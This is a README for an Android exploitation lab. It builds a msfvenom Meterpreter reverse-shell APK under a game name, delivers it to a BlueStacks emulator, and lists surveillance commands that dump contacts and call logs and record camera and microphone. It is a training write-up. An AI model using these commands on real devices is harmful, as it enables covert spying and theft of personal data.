# 📱 Android Device Exploitation Lab — msfvenom & Meterpreter (Demo via BlueStacks)

![Platform - Android](https://img.shields.io/badge/Platform-Android_(Emulated)-green)
![Attacker - Kali Linux](https://img.shields.io/badge/Attacker-Kali_Linux-red)
![Framework - Metasploit](https://img.shields.io/badge/Framework-Metasploit-orange)
![Category - Mobile Exploitation](https://img.shields.io/badge/Category-Mobile_Exploitation-blue)
![Skill - Ethical Hacking](https://img.shields.io/badge/Skill-Offensive_Security-purple)

> **Objective:** Demonstrate how to generate, deliver, and remotely control an Android Meterpreter payload using msfvenom and Metasploit, using BlueStacks as a safe emulated mobile environment.

---

## 📌 Overview
This project demonstrates the creation of a **malicious Android APK payload**, its delivery via a Python web server, and remote control through a Meterpreter session.  
BlueStacks served as a safe, fully-contained test device.

---

## 🎯 Objectives
- Generate an Android Meterpreter payload  
- Configure a Metasploit handler for reverse TCP sessions  
- Host the payload for download  
- Deliver the APK to an Android emulator  
- Establish a remote session and extract data  
- Demonstrate mobile exploitation concepts using safe tooling  

---

## 🧰 Environment & Tools

| Component | Description |
|----------|-------------|
| **Attacker** | Kali Linux |
| **Target Device** | BlueStacks Android Emulator |
| **Payload Creation** | msfvenom |
| **Listener / C2** | Metasploit (multi/handler) |
| **Delivery** | Python3 HTTP server |

---

### 🖼️ 1. msfvenom APK Creation  & Metaspolit Hanlder Setup
<img width="1047" height="705" alt="image" src="https://github.com/user-attachments/assets/3df88dbd-9819-4a1d-8fa9-ec13827f536f" />

### 🖼️ 2. Python HTTP Server Running  
<img width="634" height="510" alt="image" src="https://github.com/user-attachments/assets/9a95692d-0c50-4e67-80c9-1a853bebe77f" />


### 🖼️ 3. APK Downloaded on BlueStacks  
<img width="1069" height="608" alt="image" src="https://github.com/user-attachments/assets/a4eb714b-14a4-4935-b75e-b7f1398f7ca9" />


### 🖼️ 4. Meterpreter Session Opened  
<img width="1028" height="712" alt="image" src="https://github.com/user-attachments/assets/75d9667f-6733-4063-b991-41af97a48498" />


### 🖼️ 5. Microphone Recording Example  
<img width="1449" height="638" alt="image" src="https://github.com/user-attachments/assets/62c3e511-cd8e-416c-8706-3ed00ecce35d" />


---

## 🛠️ Payload Creation

A malicious APK was created using:

```bash
sudo msfvenom --platform android -a java \
  -p android/meterpreter/reverse_tcp \
  LHOST=192.168.0.44 LPORT=8888 \
  -f raw -o warcraft_mini.apk

```

Created a new directory:

```bash
mkdir ~/android
```

---

# 🎧 Setting Up the Metasploit Handler

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.0.44
set LPORT 8888
run
```

The handler listens for the mobile device to run the payload.

---

# 🌐 Hosting the APK with a Python Server

```bash
cd ~/android
python3 -m http.server 8000
```

BlueStacks browser navigates to:

```
http://192.168.0.44:8000
```

The malicious APK appears and can be downloaded.

---

# 📱 Establishing Remote Access

When the APK is installed and opened:

```
Meterpreter session 1 opened
```

This confirms the device is now compromised.

---

# 🧩 Post-Exploitation Capabilities

Using `?` in Meterpreter lists available modules. Examples used:

### Extract call logs  
```bash
dump_calllog
```

### Extract contacts  
```bash
dump_contacts
```

### Take a screenshot  
```bash
screenshot
```

### Capture camera  
```bash
webcam_snap
webcam_stream
```

### Record microphone  
```bash
record_mic -d 20
```

---

# 🧠 MITRE ATT&CK Mobile Mapping

This activity maps to several **MITRE Mobile ATT&CK** techniques:

| Technique ID | Name | Demonstrated? | How |
|--------------|------|---------------|------|
| **T1429** | Audio Capture | ✔️ | `record_mic -d 20` |
| **T1430** | Camera Capture | ✔️ | `webcam_snap`, `webcam_stream` |
| **T1409** | Access Sensitive Data | ✔️ | Contacts, call logs |
| **T1516** | Input / Data Collection | ✔️ | `dump_contacts`, `dump_calllog` |
| **T1412** | Execution via Malicious App | ✔️ | APK installed manually |
| **T1406** | Obfuscated/Hidden Malware | ✔️ | APK generated via msfvenom |

This demonstrates not only the exploitation but also the **defensive understanding** of attacker behaviour.

---

# 🔍 Observations & Findings

- The payload executed successfully and generated a reverse Meterpreter session  
- BlueStacks is highly effective for safe mobile exploitation labs  
- Python server delivery is simple and reliable  
- Meterpreter gives full device surveillance capability  
- No AV or defence exists on a fresh BlueStacks install → excellent for demos  

---

# 🛡️ Skills Demonstrated

- Android exploitation fundamentals  
- Payload crafting with msfvenom  
- Controlling reverse shells with Metasploit  
- Mobile post-exploitation techniques  
- C2 infrastructure configuration  
- MITRE ATT&CK threat modelling  
- Ethical hacking methodology  
- Documentation of offensive workflows  

---

# 👤 Author

**Michael Bruce**  
- Aspiring Cybersecurity Practitioner
- GitHub: https://Vavain.github.io
- LinkedIn: https://www.linkedin.com/in/michaelbruce90/

---

# ⚠️ Disclaimer

All testing was performed on an **isolated Android emulator**.  
This work is for **educational and authorised security testing only**.  
Never deploy malicious APKs on real devices or networks without explicit permission.


